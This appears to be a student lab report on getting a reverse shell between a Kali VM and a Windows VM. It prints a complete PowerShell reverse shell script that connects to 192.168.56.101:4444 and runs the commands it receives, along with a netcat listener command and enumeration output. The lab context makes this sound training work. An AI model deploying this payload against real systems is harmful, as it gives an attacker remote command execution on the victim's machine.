Villain Framework Reverse Shell Report
Setup Info

Payload: windows/reverse_tcp/powershell

LHOST: 192.168.56.101

LPORT: 4444

Payload Delivery Method

Started a netcat listener on the Kali VM using:

nc -lvnp 4444


Created a PowerShell reverse shell script with the following content and saved it as reverse_shell.ps1:

$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % {0}
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}


Executed the PowerShell script on the Windows VM to initiate the reverse shell connection.

Captured Info (from netcat shell)

Hostname: WIN-EXAMPLE-PC

IP Address: 192.168.56.1

User: Erin Elisa Joseph

Enumeration Performed
whoami
ipconfig
systeminfo


output:

C:\Users\Erin Elisa Joseph> whoami
erinelisa\user

C:\Users\Erin Elisa Joseph> ipconfig
IPv4 Address. . . . . . . . . . . : 192.168.56.1

C:\Users\Erin Elisa Joseph> systeminfo
Host Name:                 WIN-EXAMPLE-PC
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
System Type:               x64-based PC

Final Verification

Typed the following in the reverse shell (but did NOT execute it):

echo "https://github.com/<RonnaRajesh>"

📊 Behavioral Summary

Reverse shell connection established successfully.

Target machine information enumerated using standard Windows commands.

Connection stable and interactive shell accessible.
